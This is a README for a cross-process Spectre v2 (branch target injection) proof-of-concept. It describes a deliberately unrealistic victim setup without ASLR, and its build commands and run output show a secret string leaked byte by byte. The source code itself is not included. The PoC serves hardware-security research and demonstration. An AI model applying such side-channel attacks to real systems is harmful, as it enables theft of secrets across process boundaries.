# Spectre v2 (branch target injection) cross process

adapted from https://github.com/Anton-Cao/spectrev2-poc which is in the same address space

in this unrealistic proof-of-concept setup, victim has:
- the secret
- an indirect branch towards a safe target
- a spectre gadget ready to be used
- a side-channel send
- flush + reload code
- measurement and report
- no aslr

all the attacker has to do is branch target injection

same core, or different core from the same cpu works

## Output

```
$ make
gcc -Wall -O0 -o attacker attacker.c
gcc -Wall -O0 -o victim victim.c
$ ./run.sh
victim 0x11a7 - gadget 0x1175 - target 0x44080
reading 0x555555556008 success: 0x54='T'
reading 0x555555556009 success: 0x68='h'
reading 0x55555555600a success: 0x65='e'
reading 0x55555555600b success: 0x20=' '
reading 0x55555555600c success: 0x4D='M'
reading 0x55555555600d success: 0x61='a'
reading 0x55555555600e success: 0x67='g'
reading 0x55555555600f success: 0x69='i'
reading 0x555555556010 success: 0x63='c'
reading 0x555555556011 success: 0x20=' '
reading 0x555555556012 success: 0x57='W'
reading 0x555555556013 success: 0x6F='o'
reading 0x555555556014 success: 0x72='r'
reading 0x555555556015 success: 0x64='d'
reading 0x555555556016 success: 0x73='s'
reading 0x555555556017 success: 0x20=' '
reading 0x555555556018 success: 0x61='a'
reading 0x555555556019 success: 0x72='r'
reading 0x55555555601a success: 0x65='e'
reading 0x55555555601b success: 0x20=' '
reading 0x55555555601c success: 0x53='S'
reading 0x55555555601d success: 0x71='q'
reading 0x55555555601e success: 0x75='u'
reading 0x55555555601f success: 0x65='e'
reading 0x555555556020 success: 0x61='a'
reading 0x555555556021 success: 0x6D='m'
reading 0x555555556022 success: 0x69='i'
reading 0x555555556023 success: 0x73='s'
reading 0x555555556024 success: 0x68='h'
reading 0x555555556025 success: 0x20=' '
reading 0x555555556026 success: 0x4F='O'
reading 0x555555556027 success: 0x73='s'
reading 0x555555556028 success: 0x73='s'
reading 0x555555556029 success: 0x69='i'
reading 0x55555555602a success: 0x66='f'
reading 0x55555555602b success: 0x72='r'
reading 0x55555555602c success: 0x61='a'
reading 0x55555555602d success: 0x67='g'
reading 0x55555555602e success: 0x65='e'
reading 0x55555555602f success: 0x2E='.'
done - you may now ^C to stop the attacker
```
